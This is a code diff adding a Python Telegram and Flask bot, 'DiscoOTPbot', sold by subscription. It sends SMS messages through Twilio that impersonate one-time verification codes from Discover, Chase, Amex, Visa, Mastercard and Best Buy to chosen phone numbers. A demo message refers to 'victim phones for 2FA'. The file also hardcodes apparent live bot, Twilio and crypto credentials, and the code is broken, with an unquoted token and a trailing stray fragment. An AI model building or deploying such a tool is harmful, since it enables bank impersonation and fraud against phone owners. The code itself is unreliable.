@@ -1,0 +1,273 @@
+import os
+import random
+import time
+import sqlite3
+import requests
+from flask import Flask, request, jsonify
+import telebot
+from telebot.types import LabeledPrice, ReplyKeyboardMarkup, KeyboardButton
+
+# === CONFIG - Read from Render Environment Variables ===
+TELEGRAM_TOKEN = os.environ.get("8700639836:AAHfHNnUpH-c4g3ccOpMyptfpDQ_OusiJ_A")
+CRYPTO_PAY_TOKEN = os.environ.get("bc1qz5ksd5wt95k9u428ltvjf424jp3l8lkfv5sem9")
+TWILIO_ACCOUNT_SID = os.environ.get("AC5c9bfa1df5c68c15b339ed691c7a76c5")
+TWILIO_AUTH_TOKEN = os.environ.get("57aea62a367974f71ef55dfc924f3d3f")
+TWILIO_PHONE_NUMBER = os.environ.get("+18664420537")
+
+if not TELEGRAM_TOKEN:
+    raise ValueError("TELEGRAM_TOKEN environment variable is missing!")
+
+WEBHOOK_SECRET = "discootp-secret-2026"
+DB_FILE = "/data/discootp.db"
+
+app = Flask(__name__)
+bot = telebot.TeleBot(8700639836:AAHfHNnUpH-c4g3ccOpMyptfpDQ_OusiJ_A, threaded=False)
+
+# ====================== DATABASE ======================
+def init_db():
+    conn = sqlite3.connect(DB_FILE)
+    cursor = conn.cursor()
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS users (
+            user_id INTEGER PRIMARY KEY,
+            phone TEXT,
+            subscribed BOOLEAN DEFAULT 0,
+            sub_expires REAL DEFAULT 0,
+            card_issuer TEXT DEFAULT NULL,
+            sms_enabled BOOLEAN DEFAULT 0
+        )
+    ''')
+    conn.commit()
+    conn.close()
+
+def get_user(user_id):
+    conn = sqlite3.connect(DB_FILE)
+    cursor = conn.cursor()
+    cursor.execute("SELECT phone, subscribed, sub_expires, card_issuer, sms_enabled FROM users WHERE user_id = ?", (user_id,))
+    row = cursor.fetchone()
+    conn.close()
+    if row:
+        return {"phone": row[0], "subscribed": bool(row[1]), "sub_expires": row[2], "card_issuer": row[3], "sms_enabled": bool(row[4])}
+    return {"phone": None, "subscribed": False, "sub_expires": 0, "card_issuer": None, "sms_enabled": False}
+
+def save_user(user_id, phone=None, subscribed=None, sub_expires=None, card_issuer=None, sms_enabled=None):
+    conn = sqlite3.connect(DB_FILE)
+    cursor = conn.cursor()
+    cursor.execute("SELECT 1 FROM users WHERE user_id = ?", (user_id,))
+    exists = cursor.fetchone()
+    if exists:
+        updates, params = [], []
+        if phone is not None: updates.append("phone = ?"); params.append(phone)
+        if subscribed is not None: updates.append("subscribed = ?"); params.append(1 if subscribed else 0)
+        if sub_expires is not None: updates.append("sub_expires = ?"); params.append(sub_expires)
+        if card_issuer is not None: updates.append("card_issuer = ?"); params.append(card_issuer)
+        if sms_enabled is not None: updates.append("sms_enabled = ?"); params.append(1 if sms_enabled else 0)
+        if updates:
+            query = f"UPDATE users SET {', '.join(updates)} WHERE user_id = ?"
+            params.append(user_id)
+            cursor.execute(query, params)
+    else:
+        cursor.execute('''
+            INSERT INTO users (user_id, phone, subscribed, sub_expires, card_issuer, sms_enabled)
+            VALUES (?, ?, ?, ?, ?, ?)
+        ''', (user_id, phone, 1 if subscribed else 0, sub_expires or 0, card_issuer, 1 if sms_enabled else 0))
+    conn.commit()
+    conn.close()
+
+init_db()
+
+# ====================== OTP TEMPLATES ======================
+CARD_TEMPLATES = {
+    "discover": "📱 **Discover Card Verification Code**\n\nYour one-time verification code for {phone} is:\n**{code}**\n\nThis code expires in 10 minutes.\nDo not share this code with anyone.",
+    "bestbuy": "📱 **Best Buy Credit Card Verification**\n\nYour Best Buy Credit Card verification code for {phone} is:\n**{code}**\n\nValid for 10 minutes.\nDo not share it.",
+    "chase": "📱 **Chase Verification Code**\n\nYour Chase one-time passcode for {phone} is:\n**{code}**\n\nValid for 10 minutes.\nChase will never ask for this code.",
+    "amex": "📱 **American Express Verification**\n\nYour American Express verification code for {phone} is:\n**{code}**\n\nExpires in 10 minutes.\nDo not share this code.",
+    "visa": "📱 **Visa Verification Code**\n\nYour Visa verification code for {phone} is:\n**{code}**\n\nValid for 10 minutes.\nNever share this code.",
+    "mastercard": "📱 **Mastercard Verification Code**\n\nYour Mastercard verification code for {phone} is:\n**{code}**\n\nExpires in 10 minutes.\nDo not share this code."
+}
+
+# ====================== SMS GATEWAY (Twilio) ======================
+def send_sms_via_twilio(phone, message):
+    if not all([TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN, TWILIO_PHONE_NUMBER]):
+        return False, "SMS gateway not configured."
+    try:
+        from twilio.rest import Client
+        client = Client(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)
+        msg = client.messages.create(body=message, from_=TWILIO_PHONE_NUMBER, to=phone)
+        return True, f"SMS sent (SID: {msg.sid})"
+    except Exception as e:
+        return False, f"SMS failed: {str(e)}"
+
+# ====================== BOT HANDLERS ======================
+@bot.message_handler(commands=['start', 'help'])
+def send_welcome(message):
+    markup = ReplyKeyboardMarkup(resize_keyboard=True)
+    markup.add(KeyboardButton("Create My Personal OTP Bot", request_managed_bot=True))
+    bot.reply_to(message, 
+        "🔐 **DiscoOTPbot** — Multi-Card OTP Service\n\n"
+        "**Commands:**\n"
+        "/start - Show main menu\n"
+        "/discover - Select Discover Card\n"
+        "/bestbuy - Select Best Buy Credit Card\n"
+        "/chase - Select Chase\n"
+        "/amex - Select American Express\n"
+        "/visa - Select Visa\n"
+        "/mastercard - Select Mastercard\n"
+        "/phone - Set phone number\n"
+        "/code - Request OTP code\n"
+        "/subscribe - Premium via Stars\n"
+        "/subscribe_crypto - Premium via USDT\n"
+        "/subscribe_crypto_btc - Premium via BTC\n"
+        "/sms enable - Enable real SMS\n"
+        "/sms disable - Disable real SMS\n"
+        "/pin_demo - Show carousel demo",
+        reply_markup=markup)
+
+@bot.message_handler(commands=['discover', 'bestbuy', 'chase', 'amex', 'visa', 'mastercard'])
+def select_card(message):
+    issuer = message.text[1:].lower()
+    save_user(message.from_user.id, card_issuer=issuer)
+    bot.reply_to(message, f"✅ **{issuer.capitalize()}** pipeline activated.")
+
+@bot.message_handler(commands=['sms'])
+def toggle_sms(message):
+    parts = message.text.split()
+    if len(parts) > 1 and parts[1].lower() == "enable":
+        save_user(message.from_user.id, sms_enabled=True)
+        bot.reply_to(message, "✅ Real SMS delivery enabled.")
+    elif len(parts) > 1 and parts[1].lower() == "disable":
+        save_user(message.from_user.id, sms_enabled=False)
+        bot.reply_to(message, "✅ Switched to in-chat only.")
+    else:
+        user = get_user(message.from_user.id)
+        status = "enabled" if user.get("sms_enabled") else "disabled"
+        bot.reply_to(message, f"SMS mode: {status}")
+
+@bot.message_handler(commands=['phone'])
+def ask_phone(message):
+    bot.reply_to(message, "Enter a test phone number (e.g., +15551234567):")
+
+@bot.message_handler(commands=['subscribe'])
+def send_stars_invoice(message):
+    try:
+        bot.send_invoice(
+            chat_id=message.chat.id,
+            title="DiscoOTPbot Premium Monthly",
+            description="Unlimited OTP codes + SMS delivery.",
+            payload="discootp_premium",
+            provider_token="",
+            currency="XTR",
+            prices=[LabeledPrice("Monthly", 499)]
+        )
+    except Exception as e:
+        bot.reply_to(message, f"Error: {str(e)}")
+
+@bot.message_handler(content_types=['successful_payment'])
+def got_stars_payment(message):
+    user_id = message.from_user.id
+    expires = time.time() + (30 * 24 * 60 * 60)
+    save_user(user_id, subscribed=True, sub_expires=expires)
+    bot.reply_to(message, "✅ Premium activated!")
+
+def create_crypto_invoice(message, asset="USDT", amount="5.00"):
+    try:
+        payload = {
+            "asset": asset,
+            "amount": amount,
+            "description": f"DiscoOTPbot Premium Monthly ({asset})",
+            "payload": f"user_{message.from_user.id}",
+            "paid_btn_name": "open_app",
+            "paid_btn_url": "https://t.me/DiscoOTPbot"
+        }
+        headers = {"Crypto-Pay-API-Token": CRYPTO_PAY_TOKEN}
+        response = requests.post("https://pay.crypt.bot/api/createInvoice", json=payload, headers=headers)
+        data = response.json()
+        if data.get("ok"):
+            invoice = data["result"]
+            bot.send_message(message.chat.id, f"💰 {asset} Invoice Created!\nPay here: {invoice['pay_url']}")
+    except Exception as e:
+        bot.reply_to(message, f"Error: {str(e)}")
+
+@bot.message_handler(commands=['subscribe_crypto'])
+def subscribe_usdt(message):
+    create_crypto_invoice(message, asset="USDT", amount="5.00")
+
+@bot.message_handler(commands=['subscribe_crypto_btc'])
+def subscribe_btc(message):
+    create_crypto_invoice(message, asset="BTC", amount="0.0003")
+
+@bot.message_handler(commands=['code'])
+def send_otp(message):
+    user_id = message.from_user.id
+    user = get_user(user_id)
+    if not user["subscribed"] or user["sub_expires"] < time.time():
+        bot.reply_to(message, "❌ Premium required or expired.")
+        return
+    if not user["phone"]:
+        bot.reply_to(message, "❌ No phone on file. Use /phone first.")
+        return
+    if not user["card_issuer"]:
+        bot.reply_to(message, "❌ No card selected. Use /discover, /bestbuy, etc.")
+        return
+
+    code = random.randint(100000, 999999)
+    template = CARD_TEMPLATES.get(user["card_issuer"], CARD_TEMPLATES["discover"])
+    otp_message = template.format(phone=user["phone"], code=code)
+
+    if user.get("sms_enabled"):
+        success, result = send_sms_via_twilio(user["phone"], otp_message)
+        if success:
+            bot.reply_to(message, f"✅ OTP sent via real SMS!\n{result}")
+        else:
+            bot.reply_to(message, f"⚠️ SMS failed.\n\n{otp_message}")
+    else:
+        bot.reply_to(message, otp_message)
+
+@bot.message_handler(func=lambda message: True)
+def handle_text(message):
+    text = message.text.strip()
+    user_id = message.from_user.id
+    if any(c.isdigit() for c in text) and len(text) > 8:
+        save_user(user_id, phone=text)
+        bot.reply_to(message, f"✅ Phone saved: {text}\nUse /code (premium).")
+    else:
+        bot.reply_to(message, "Use /start for commands.")
+
+@bot.message_handler(commands=['pin_demo'])
+def pin_demo(message):
+    bot.reply_to(message, "📌 Multi-Pin Carousel Demo")
+    time.sleep(0.7)
+    bot.send_message(message.chat.id, "📍 OTP Drop #1 – Discover activation")
+    time.sleep(0.7)
+    bot.send_message(message.chat.id, "📍 Victim phones for 2FA")
+    time.sleep(0.7)
+    bot.send_message(message.chat.id, "📍 Payment instructions")
+    bot.reply_to(message, "Pin 2+ messages → carousel appears at top.")
+
+# ====================== WEBHOOKS ======================
+@app.route('/webhook', methods=['POST'])
+def telegram_webhook():
+    update = telebot.types.Update.de_json(request.get_json())
+    bot.process_new_updates([update])
+    return jsonify({"status": "ok"}), 200
+
+@app.route('/set_webhook', methods=['GET'])
+def set_telegram_webhook():
+    public_url = os.environ.get("RENDER_EXTERNAL_URL", "https://your-app.onrender.com")
+    result = bot.set_webhook(url=f"{public_url}/webhook")
+    return f"Telegram webhook set: {result}"
+
+@app.route('/set_crypto_webhook', methods=['GET'])
+def set_crypto_webhook():
+    public_url = os.environ.get("RENDER_EXTERNAL_URL", "https://your-app.onrender.com")
+    headers = {"Crypto-Pay-API-Token": CRYPTO_PAY_TOKEN}
+    response = requests.post("https://pay.crypt.bot/api/setWebhook", json={"url": f"{public_url}/crypto_webhook"}, headers=headers)
+    return f"Crypto Pay webhook set: {response.json()}"
+
+@app.route('/')
+def home():
+    return "DiscoOTPbot is Running"
+
+if __name__ == "__main__":
+    print("🚀 DiscoOTPbot started")
+    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))EN = "YOUR_CRYPTO_PAY_API_TOKEN_HERE"
